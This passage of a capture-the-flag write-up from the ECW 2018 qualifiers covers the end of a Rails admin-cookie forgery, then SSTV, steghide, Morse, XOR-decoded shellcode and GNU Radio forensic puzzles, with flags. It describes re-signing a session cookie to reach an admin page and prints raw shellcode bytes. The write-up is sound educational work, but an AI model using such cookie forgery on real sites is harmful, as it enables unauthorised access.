I fill the fields with the appropriate data and `encrypt_and_sign` the cookie with the new `secret_key_base`.

## Flag

I just overwrite my old cookie with my fresh one, and finally go on the `/admin/` page on prod:

<center>
![](https://media.giphy.com/media/12NUbkX6p4xOO4/giphy.gif)
</center>

> ECW{2c9ff616d19419cc9ca91f5b0829e802} 

---

# Drone Wars 1

<center>

| Event   | Challenge    | Category         | Points | Solves |
|---------|--------------|------------------|--------|--------|
|ECW Quals|Drone Wars 1  | "Forensic"       |??      | ??     |

</center>

## State of the art

We have 2 files: `Capture.zip` and `capture.wav`. There is a binary file in the zip archive, don't worry about it for now.

After several hours of crawling the internet searching for datas about the .wav files, I found a stego technic: SSTV.

> https://medium.com/@sumit.arora/audio-steganography-the-art-of-hiding-secrets-within-earshot-part-2-of-2-c76b1be719b3

I found a tool for linux: `qsstv`.

## Decoding the .wav

I run `QSSTV` with `VLC` in background, set my audio output into QSSTV, and:

<center>
![](/img/writeups/qualsecw2018/drone1.png)
_Fig1_: Decoded picture
</center>

## Flag

> ECW{da553166e44a3151dfe422c34f693fe6}

---

# Drone Wars Hint 1

<center>

| Event   | Challenge | Category         | Points | Solves |
|---------|-----------|------------------|--------|--------|
|ECW Quals|DW Hint1   | "Forensic"       |??      | ??     |

</center>

Like the first Drone Wars challenge, we have a horrible `.wav` file. Let's try with QSSTV:

<center>
![](/img/writeups/qualsecw2018/drone2.png)
_Fig1_: Decoded picture
</center>

Same thing :)

## Flag

> ECW{SHELLCODES}

---

# Drone wars 2

<center>

| Event   | Challenge | Category         | Points | Solves |
|---------|-----------|------------------|--------|--------|
|ECW Quals|DW 2       | "Forensic"       |??      | ??     |

</center>

In the first challenge, we got a QR code. It contained the following data:

> 6xVeMcAx2zHJs0WwKjEEDkE5y3X4/+bo5v///xvqG/Eb4xv4mi6ZK8Emc5gAPueqG+pqG/HnqsLF1dXVbwBpfVFLHhtPT05LGxNOThlJABlMThJITxIbGEgdEkxMHBsASE9IVyA=

Decoded:

> \xeb\x15^1\xc01\xdb1\xc9\xb3E\xb0*1\x04\x0eA9\xcbu\xf8\xff\xe6\xe8\xe6\xff\xff\xff\x1b\xea\x1b\xf1\x1b\xe3\x1b\xf8\x9a.\x99+\xc1&s\x98\x00>\xe7\xaa\x1b\xeaj\x1b\xf1\xe7\xaa\xc2\xc5\xd5\xd5\xd5o\x00i}QK\x1e\x1bOONK\x1b\x13NN\x19I\x00\x19LN\x12HO\x12\x1b\x18H\x1d\x12LL\x1c\x1b\x00HOHW 

Wow, cool, bullshit. Let's try with le old bruteforce technique. Rotation? Nope. XOR ? Yes! It was a one byte key.

```python
#!/usr/bin/python2

import base64

msg = base64.b64decode('6xVeMcAx2zHJs0WwKjEEDkE5y3X4/+bo5v///xvqG/Eb4xv4mi6ZK8Emc5gAPueqG+pqG/HnqsLF1dXVbwBpfVFLHhtPT05LGxNOThlJABlMThJITxIbGEgdEkxMHBsASE9IVyA=')
key = chr(42)
s = ""

for j in range(256):
    j = chr(j)
    for i in range(len(msg)):
        s += chr(ord(msg[i])^ord(j[i%len(j)]))
        if 'W{' in s:
            print(s)
    s = ""
```

> �?to��_��������1�1�1�1Ұ��
                         Y�*̀1�@1�̀�����E*CW{a41eeda19dd3c*3fd8be812b78ff61*beb}
 
## Flag

> ECW{a41eeda19dd3c3fd8be812b78ff61beb}

---

# Drone wars hint 2

<center>

| Event   | Challenge | Category         | Points | Solves |
|---------|-----------|------------------|--------|--------|
|ECW Quals|DW Hint 2  | "Forensic"       |??      | ??     |

</center>

## State of the art

We have a JPG picture, a lot of steg stuff can be effective.

<center>
![](/img/writeups/qualsecw2018/dwhint2.jpg)
_Fig1_: Original picture
</center>

## Guessing of the year

I went with the `steghide` tool... And the steghide passphrase: `ECW`.

```bash
$ steghide extract -sf DSC20181007160312834378.jpg
Entrez la passphrase: (ECW)
�criture des donn�es extraites dans "secret.txt".

$ cat secret.txt 
..-. .. .-.. . / ... --- ..- .-. -.-. . / -....- # / --. ..-. ... -.- / -.. . -- --- -.. / -....- # / .--. .- -.-. -.- . - / -.. . -.-. --- -.. . .-. / -....- # / ..-. .. .-.. . / ... .. -. -.-
```

## Morse to binary

> https://www.dcode.fr/code-morse

Input:

```
..-. .. .-.. . / ... --- ..- .-. -.-. . / -....- / --. ..-. ... -.- / -.. . -- --- -.. / -....- / .--. .- -.-. -.- . - / -.. . -.-. --- -.. . .-. / -....- / ..-. .. .-.. . / ... .. -. -.-
```

Output and flag:

> FILE SOURCE - GFSK DEMOD - PACKET DECODER - FILE SINK

---

# Drone wars 3

<center>

| Event   | Challenge | Category         | Points | Solves |
|---------|-----------|------------------|--------|--------|
|ECW Quals|DW 2       | "Forensic"       |??      | ??     |

</center>

## State of the art

Do you remember the binary file in the zip archive in the Drone Wars 1 challenge? The `Capture.bin` one. Thanks to the Drone Wars 2 hint, we now know that we have to use `GNU Radio`.

File source, GFSK demode, etc... Are GNU Radio blocks to decode a source file.

## GNU Radio

<center>
![](/img/writeups/qualsecw2018/drone3_1.png)
_Fig1_: GNU Radio blocks
</center>

I choose this configuration:

* File source -> GFSK Demod: Complex mode
* GFSK Demod -> Packet decoder -> File Sink: Byte mode

Let's run this, and see what kind of data there is in our `toto.bin` file:

<center>
![](/img/writeups/qualsecw2018/drone3_2.png)
_Fig2_: Raw GPS coordinates
</center>

## GPS to ASCII

By googling `gps to ascii`, I found this website:

> http://www.gpsvisualizer.com/convert_input

I format my `toto.bin` into a valid CSV file for this website:

<center>
![](/img/writeups/qualsecw2018/drone3_3.png)
_Fig3_: Valid CSV
</center>

## Flag

And then (when zooming):

<center>
![](/img/writeups/qualsecw2018/drone3_4.png)
_Fig4_: Flag
</center>
